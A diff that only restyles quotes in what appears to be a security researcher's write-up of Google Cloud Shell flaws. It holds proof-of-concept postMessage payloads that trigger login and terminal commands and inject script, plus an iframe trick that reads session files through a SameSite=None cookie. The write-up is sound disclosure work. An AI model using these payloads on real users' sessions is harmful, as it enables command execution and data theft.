@@ -9,10 +9,10 @@ I'm not sure when the API opt in was added, I think it used to have credentials 
 
 ```js
 window.parent.postMessage({
-  target: "ID from URL of webview",
-  channel: "onmessage",
+  target: 'ID from URL of webview',
+  channel: 'onmessage',
   data: {
-    type: "LOG_IN",
+    type: 'LOG_IN',
   },
 }); // Childs are trusted just rename “channel” to “command” and remove “target”.
 ```
@@ -25,11 +25,11 @@ Google Cloud Shell does not isolate webviews into their own origins like said [h
 
 ```js
 window.parent.postMessage({
-  target: "ID from URL of webview",
-  channel: "onmessage",
+  target: 'ID from URL of webview',
+  channel: 'onmessage',
   data: {
     text: "echo ':)'",
-    type: "RUN_IN_TERMINAL",
+    type: 'RUN_IN_TERMINAL',
   },
 });
 ```
@@ -50,13 +50,13 @@ Then to get [XSS](https://owasp.org/www-community/attacks/xss/) any opener can s
 ```js
 w[2][0].postMessage(
   {
-    channel: "content",
+    channel: 'content',
     args: {
-      options: { allowScripts: true },
-      contents: "<script>document.write(document.domain)</script>",
+      options: {allowScripts: true},
+      contents: '<script>document.write(document.domain)</script>',
     },
   },
-  "*",
+  '*',
 );
 ```
 
@@ -70,7 +70,7 @@ Cant tell if the `Missing Schema Check` is a valid concern for CVE-2022-24526 si
 Since there's no embedding protection on /\_cloudshell/ and a “SameSite None” cookie is used for “CloudShellAuthorization” it's possible to embed the files on to an attacker controlled website like
 
 ```js
-iframe.src = "8080-SERVER.cloudshell.dev/_cloudshell/file?path=/entrypoint.sh";
+iframe.src = '8080-SERVER.cloudshell.dev/_cloudshell/file?path=/entrypoint.sh';
 ```
 
 When the Theia subdomain is known (DNS is normally insecure) this allows attacks like [The Human Side Channel](https://ronmasas.com/posts/the-human-side-channel) and [Element leaks](https://xsleaks.dev/docs/attacks/element-leaks/).  
